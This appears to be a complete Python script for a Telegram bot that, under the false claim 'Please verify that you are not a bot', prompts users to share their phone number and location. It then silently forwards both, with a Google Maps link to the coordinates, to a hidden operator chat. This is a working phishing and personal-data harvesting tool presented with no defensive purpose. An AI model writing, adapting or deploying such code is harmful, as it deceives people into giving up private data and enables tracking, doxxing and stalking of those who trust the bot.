import os
import telebot
from telebot import types

Token = os.getenv('TELEGRAM_BOT_TOKEN')
bot = telebot.TeleBot(Token)
id = os.getenv('TELEGRAM_BOT_ID')

@bot.message_handler(commands=['start'])
def register(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    keyboard.add(
        types.KeyboardButton(text="Share My Number", request_contact=True),
        types.KeyboardButton(text="Share My Location", request_location=True)
    )
    bot.send_message(message.chat.id, "Please verify that you are not a bot", reply_markup=keyboard)

@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    bot.send_message(id, text=f"Done Get Phone Number: {message.contact.phone_number}")
    bot.send_message(message.chat.id, text="Thanks :)")

@bot.message_handler(content_types=['location'])
def location_handler(message):
    loc = message.location
    bot.send_message(id, text=f'''
Done Get User Location:
Latitude = {loc.latitude}
Longitude = {loc.longitude}
● [Google Map](https://www.google.com/maps/place/{loc.latitude},{loc.longitude})
''', parse_mode='markdown')
    bot.send_message(message.chat.id, text="Thanks for sharing your location :)")

print('- Start Bot.')
bot.infinity_polling()
